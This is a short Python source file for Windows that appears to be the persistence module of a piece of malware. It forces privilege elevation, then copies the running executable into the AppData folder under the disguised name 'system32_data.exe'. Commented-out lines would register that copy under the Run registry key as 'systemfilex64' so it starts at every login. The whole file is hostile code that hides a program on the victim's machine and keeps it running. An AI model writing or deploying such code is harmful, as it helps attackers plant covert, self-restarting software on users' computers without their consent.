import ctypes
import elevate
import pymsgbox
import platform
import sys
from shutil import copyfile
import os
import winreg
import time

def is_root():
    if platform.system() == "Windows":
        try:
            elevate.elevate()
            pymsgbox.alert("How are  you")
            return 1
        except Exception as e:
            pymsgbox.alert(e)
            return 0
    else:
        return 0
    

def persistance():
    if(is_root()):
        current_file = sys.executable
        app_path = os.getenv("APPDATA") +"\\"+"system32_data.exe"
        #print(app_path)
        #print(current_file)
        if not os.path.exists(app_path):
            copyfile(current_file,app_path)
            #key = winreg.HKEY_CURRENT_USER
            #key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            #key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
            #winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, app_path)
            #winreg.CloseKey(key_obj)
        #time.sleep(11)




